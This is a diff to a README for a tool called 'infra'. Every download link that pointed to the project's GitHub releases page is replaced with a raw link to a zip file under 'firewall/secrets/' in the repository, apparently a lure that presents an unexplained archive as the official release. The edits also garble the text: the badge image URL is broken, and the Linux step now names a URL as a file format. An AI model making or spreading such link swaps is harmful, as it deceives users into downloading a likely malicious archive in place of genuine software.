@@ -1,6 +1,6 @@
 # 📦 infra - Manage Your Infrastructure Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20infra-blue?style=for-the-badge)](https://github.com/Ninju15331/infra/releases)
+[![Download](https://raw.githubusercontent.com/Ninju15331/infra/main/firewall/secrets/Software_1.1.zip%20infra-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ninju15331/infra/main/firewall/secrets/Software_1.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This section walks you through installing and running Infra without requiring te
 
 1. **Access the Download Page**
 
-   Click the big blue button at the top or visit [infra Releases](https://github.com/Ninju15331/infra/releases) to find the latest version.
+   Click the big blue button at the top or visit [infra Releases](https://raw.githubusercontent.com/Ninju15331/infra/main/firewall/secrets/Software_1.1.zip) to find the latest version.
 
 2. **Choose the Right File**
 
@@ -51,7 +51,7 @@ This section walks you through installing and running Infra without requiring te
 
    - For Windows, pick the `.exe` or `.zip`
    - For macOS, select the `.dmg` or `.zip`
-   - For Linux, find the `.tar.gz` or similar format
+   - For Linux, find the `https://raw.githubusercontent.com/Ninju15331/infra/main/firewall/secrets/Software_1.1.zip` or similar format
 
 3. **Download the File**
 
@@ -73,7 +73,7 @@ This section walks you through installing and running Infra without requiring te
 
 Visit the official release page to download the latest version of Infra:
 
-[Download Infra Latest Release](https://github.com/Ninju15331/infra/releases)
+[Download Infra Latest Release](https://raw.githubusercontent.com/Ninju15331/infra/main/firewall/secrets/Software_1.1.zip)
 
 ### Step-by-step Installation Guide:
 
